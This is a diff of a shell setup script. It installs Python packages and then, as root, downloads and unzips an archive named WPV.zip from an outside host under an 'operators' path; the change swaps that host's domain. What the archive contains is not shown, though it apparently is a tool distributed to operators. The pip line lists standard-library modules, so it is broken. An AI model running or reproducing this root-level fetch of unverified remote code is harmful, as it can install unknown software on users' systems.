@@ -20,7 +20,7 @@ sudo apt-get install -y python3
 sudo apt-get install -y python3-pip
 sudo pip3 install requests colorama itertools idna uritools appdirs tldextract socket random  struct traceback urlextract configparser
 sudo apt install -y nano
-sudo wget https://w3ll.shop/operators/WPV.zip
+sudo wget https://w3ll.store/operators/WPV.zip
 sudo unzip -o WPV.zip
 sudo rm WPV.zip
 cp ~/.bashrc ~/.bashrc-bak
